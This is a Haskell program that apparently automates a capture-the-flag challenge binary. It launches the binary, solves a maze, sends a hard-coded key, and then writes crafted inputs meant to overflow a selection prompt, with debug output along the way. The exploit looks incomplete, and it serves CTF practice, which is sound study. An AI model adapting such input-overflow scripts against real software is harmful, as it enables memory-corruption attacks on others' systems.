{-# LANGUAGE CPP #-}

module Main where

#if __GLASGOW_HASKELL__ < 710
import Control.Applicative
#endif

import Control.Concurrent (threadDelay)
import System.IO (BufferMode(NoBuffering, LineBuffering), Handle, hFlush, hGetContents, hPutStr, hPutStrLn, hSetBuffering)
import System.Process (CreateProcess(..), StdStream(..), createProcess, proc)

import SolveMaze
import Util

writeTardisKey :: String      -- ^ string that has been read so far from child's stdout (this isn't used)
               -> Handle      -- ^ 'Handle' of the child's stdin
               -> Handle      -- ^ 'Handle' of the child's stdout
               -> IO (String) -- ^ String that has been read so far but nothing done with it.
writeTardisKey _ childStdinHandle childStdoutHandle = do
    hPutStrLn childStdinHandle "UeSlhCAGEp"
    readUntilMultiDebug True childStdoutHandle ["Selection: "]

writeFirstSelectionOverflow :: String -> Handle -> Handle -> IO (String)
writeFirstSelectionOverflow _ childStdinHandle childStdoutHandle = do
    hSetBuffering childStdinHandle LineBuffering
    hPutStr childStdinHandle "11111111\00"
    hFlush childStdinHandle
    putStrLn "******* Wrotes ones..."
    x <- readUntilMultiDebug False childStdoutHandle ["Selection: "]
    putStrLn "******* READ AFTER WROTE 111111:"
    putStrLn x
    putStrLn "******* Sleeping 3 secs:"
    threadDelay 3000000
    hPutStrLn childStdinHandle "m+YU"
    putStrLn "******* Wrotes weird thing..."
    hPutStr childStdinHandle "11111111\00"
    putStrLn "******* Wrotes ones..."
    hPutStr childStdinHandle "33333333\00"
    hFlush childStdinHandle
    putStrLn "******* Wrotes threes..."
    -- what <- readUntilMultiDebug True childStdoutHandle ["Coordinates: "]
    what <- hGetContents childStdoutHandle
    putStrLn "******* Until coordinates..."
    putStrLn what
    return what

mainLoop :: Handle -> Handle -> IO ()
mainLoop childStdinHandle childStdoutHandle = do
    tardisKeyString <- solveMaze "" childStdinHandle childStdoutHandle
    selectionString <- writeTardisKey tardisKeyString childStdinHandle childStdoutHandle
    coordinatesString <- writeFirstSelectionOverflow selectionString
                                                     childStdinHandle
                                                     childStdoutHandle
    return ()

main :: IO ()
main = do
    let processToRun = (proc "./wwtw_c3722e23150e1d5abbc1c248d99d718d" [])
                            { std_out = CreatePipe
                            , std_in = CreatePipe }
    -- this stdin and stdout are the for the CHILD, so WE can READ from
    -- wwtwStdout and WRITE to wwtwStdin.
    (Just wwtwStdin, Just wwtwStdout, _, _) <- createProcess processToRun
    hSetBuffering wwtwStdin NoBuffering
    mainLoop wwtwStdin wwtwStdout
